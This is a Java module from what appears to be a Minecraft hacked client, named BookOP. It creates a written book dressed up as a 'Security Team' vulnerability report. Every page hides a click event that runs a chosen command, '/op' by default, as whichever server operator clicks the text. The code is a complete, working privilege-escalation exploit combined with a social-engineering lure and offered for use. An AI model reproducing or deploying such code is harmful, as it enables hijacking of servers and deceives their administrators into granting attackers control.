package dev.oblivion.client.module.exploit;

import dev.oblivion.client.module.Category;
import dev.oblivion.client.module.Module;
import dev.oblivion.client.setting.impl.StringSetting;
import dev.oblivion.client.setting.impl.EnumSetting;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.WrittenBookContentComponent;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.text.ClickEvent;
import net.minecraft.text.RawFilteredPair;
import net.minecraft.text.Text;

import java.util.ArrayList;
import java.util.List;

public class BookOP extends Module {

    public enum Payload {
        OP_COMMAND,
        GAMEMODE_CREATIVE,
        GIVE_DIAMOND,
        CUSTOM
    }

    private final EnumSetting<Payload> payload = settings.getDefaultGroup().add(
        new EnumSetting.Builder<Payload>().name("Payload").description("Command to execute when admin clicks the book.").defaultValue(Payload.OP_COMMAND).build()
    );
    private final StringSetting target = settings.getDefaultGroup().add(
        new StringSetting.Builder().name("Target").description("Player to target (your name for OP).").defaultValue("").build()
    );
    private final StringSetting customCmd = settings.getDefaultGroup().add(
        new StringSetting.Builder().name("CustomCmd").description("Custom command for CUSTOM mode.").defaultValue("/say hacked").build()
    );
    private final StringSetting bookTitle = settings.getDefaultGroup().add(
        new StringSetting.Builder().name("BookTitle").description("Title of the book.").defaultValue("Server Report").build()
    );
    private final StringSetting bookAuthor = settings.getDefaultGroup().add(
        new StringSetting.Builder().name("Author").description("Author name shown on book.").defaultValue("Security Team").build()
    );

    public BookOP() {
        super("BookOP", "Creates a book that runs commands when an op clicks any page text.", Category.EXPLOIT);
    }

    @Override
    protected void onEnable() {
        if (mc.player == null || mc.getNetworkHandler() == null) { disable(); return; }
        if (!mc.player.getAbilities().creativeMode) {
            mc.player.sendMessage(Text.literal("\u00a7c[BookOP] Requires creative mode to create the book."), false);
            disable();
            return;
        }

        String playerName = target.get().isBlank() ? mc.player.getName().getString() : target.get();

        String command = switch (payload.get()) {
            case OP_COMMAND -> "/op " + playerName;
            case GAMEMODE_CREATIVE -> "/gamemode creative " + playerName;
            case GIVE_DIAMOND -> "/give " + playerName + " diamond 64";
            case CUSTOM -> customCmd.get();
        };

        // Create Written Book with ClickEvent.RUN_COMMAND embedded in text
        // When an op clicks ANY text on the page, the command silently executes as them
        ItemStack book = new ItemStack(Items.WRITTEN_BOOK, 1);
        List<RawFilteredPair<Text>> pages = new ArrayList<>();

        // Page 1: Entire page text has an invisible run_command click event
        Text page1 = Text.literal(
            "Dear Admin,\n\n" +
            "A critical server vulnerability\n" +
            "has been discovered.\n\n" +
            "Click here for full details\n" +
            "and the recommended fix.\n\n" +
            "- " + bookAuthor.get()
        ).styled(style -> style.withClickEvent(
            new ClickEvent(ClickEvent.Action.RUN_COMMAND, command)
        ));
        pages.add(RawFilteredPair.of(page1));

        // Page 2: Also has the command click event as backup
        Text page2 = Text.literal(
            "Vulnerability Report\n" +
            "ID: OBL-" + (int)(Math.random() * 90000 + 10000) + "\n\n" +
            "Type: Item Duplication\n" +
            "Severity: Critical\n\n" +
            "An exploit allows item\n" +
            "duplication via container\n" +
            "desync during chunk\n" +
            "unloading.\n\n" +
            "Click to acknowledge."
        ).styled(style -> style.withClickEvent(
            new ClickEvent(ClickEvent.Action.RUN_COMMAND, command)
        ));
        pages.add(RawFilteredPair.of(page2));

        // Page 3: Third page with the click event
        Text page3 = Text.literal(
            "Recommended Actions:\n\n" +
            "1. Apply the hotfix patch\n" +
            "2. Restart affected services\n" +
            "3. Monitor player inventory\n" +
            "   logs for anomalies\n\n" +
            "Thank you for your prompt\n" +
            "attention to this matter.\n\n" +
            "Click to close report."
        ).styled(style -> style.withClickEvent(
            new ClickEvent(ClickEvent.Action.RUN_COMMAND, command)
        ));
        pages.add(RawFilteredPair.of(page3));

        book.set(DataComponentTypes.WRITTEN_BOOK_CONTENT,
            new WrittenBookContentComponent(
                RawFilteredPair.of(bookTitle.get()),
                bookAuthor.get(),
                0,
                pages,
                true
            )
        );

        mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36, book));
        mc.player.sendMessage(Text.literal("\u00a7a[BookOP] Book created with hidden command: " + command), false);
        mc.player.sendMessage(Text.literal("\u00a7e[BookOP] Give this book to an op - clicking any text runs the command as them."), false);
        disable();
    }
}
